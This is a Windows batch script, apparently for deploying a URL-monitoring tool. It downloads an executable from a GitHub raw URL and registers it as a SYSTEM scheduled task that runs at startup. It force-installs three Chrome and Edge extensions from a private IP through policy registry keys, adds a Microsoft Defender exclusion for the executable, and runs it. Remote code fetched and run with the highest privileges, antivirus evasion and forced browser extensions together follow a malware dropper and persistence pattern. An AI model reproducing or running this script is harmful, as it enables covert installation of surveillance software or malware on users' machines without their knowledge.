@echo off
setlocal enabledelayedexpansion

:: === Kill monitorUrlnew.exe if running ===
powershell -Command "Get-Process monitorUrlnew -ErrorAction SilentlyContinue | Stop-Process -Force"

:: === Configuration ===
set "URL=https://raw.githubusercontent.com/vietwe1993/deploy/main/monitorurlnew.exe"
set "TARGET_DIR=C:\Users\Public"
set "TARGET_FILE=monitorUrlnew.exe"
set "TASK_NAME=MonitorUrlTask"

:: === Create target directory if it doesn't exist ===
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: === Delete old file if it exists ===
if exist "%TARGET_DIR%\%TARGET_FILE%" (
    del /f /q "%TARGET_DIR%\%TARGET_FILE%"
)

:: === Download new file ===
where curl >nul 2>&1
if %errorlevel%==0 (
    curl -L -o "%TARGET_DIR%\%TARGET_FILE%" "%URL%"
) else (
    bitsadmin /transfer myDownloadJob /download /priority normal "%URL%" "%TARGET_DIR%\%TARGET_FILE%"
)

:: === Delete existing task if it exists ===
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    schtasks /delete /tn "%TASK_NAME%" /f
)

:: === Create new scheduled task to run as SYSTEM at startup ===
schtasks /create ^
    /tn "%TASK_NAME%" ^
    /tr "%TARGET_DIR%\%TARGET_FILE%" ^
    /sc onstart ^
    /ru "SYSTEM" ^
    /f

:: === XÓA registry extension cũ (nếu có) ===
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /f >nul 2>&1

:: === Add Chrome Extension policies to registry ===
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallSources" /v 1 /t REG_SZ /d "http://192.168.193.120/*" /f

reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "pojbdkmhmcanmgioongckbcfcpklhfkl;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "gjojihjbefnglipnfikbdcbbiijcngal;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f

:: === Add Edge Extension policies to registry ===
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallSources" /v 1 /t REG_SZ /d "http://192.168.193.120/*" /f

reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "pojbdkmhmcanmgioongckbcfcpklhfkl;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "gjojihjbefnglipnfikbdcbbiijcngal;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f

:: === Exclude from Defender and launch ===
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
start "" "C:\Users\Public\monitorUrlnew.exe"
exit /b 0
